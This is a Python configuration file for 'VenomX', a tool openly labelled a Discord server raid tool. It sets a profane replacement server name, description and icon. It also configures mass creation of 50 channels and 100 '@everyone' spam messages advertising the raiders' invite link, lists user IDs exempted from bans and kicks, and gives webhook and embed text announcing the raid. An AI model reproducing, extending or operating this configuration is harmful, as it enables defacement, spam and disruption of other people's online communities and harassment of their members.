# config.py - VenomX Configuration

import json
import os

# Default configuration
DEFAULT_CONFIG = {
    "SERVER_CONFIG": {
        "new_name": "FUCKED BY VENOMX",  
        "new_description": "RAIDED BY VENOMX",  
        "new_icon": "https://i.imgur.com/aL0Q8ty.jpeg"
    },
    "WEBHOOK_CONFIG": {
        "default_name": "VENOMX RAID"   
    },
    "AUTO_RAID_CONFIG": {
        'num_channels': 50,  
        'channel_type': 'text',   
        'channel_name': 'RAIDED-BY-VENOMX',  
        'num_messages': 100,   
        'message_content': '@everyone SERVER RAIDED BY VENOMX https://discord.gg/UJd7XSp87' 
    },
    "NO_BAN_KICK_ID": [
        927989800387096586,
        1294173092234526770
    ],
    "BOT_PRESENCE": {
        "type": "watching", 
        "text": "https://discord.gg/UJd7XSp87" 
    },
    "EMBED_CONFIG": {
        "title": "VENOMX RAID",    
        "description": "SERVER HAS BEEN RAIDED BY VENOMX\nJoin: https://discord.gg/UJd7XSp87",            
        "color": 0xFF0000,      
        "fields": [
            {"name": "JOIN VENOMX", "value": "https://discord.gg/UJd7XSp87", "inline": False}
        ],
        "footer": "VENOMX RAID TOOL"     
    }
}
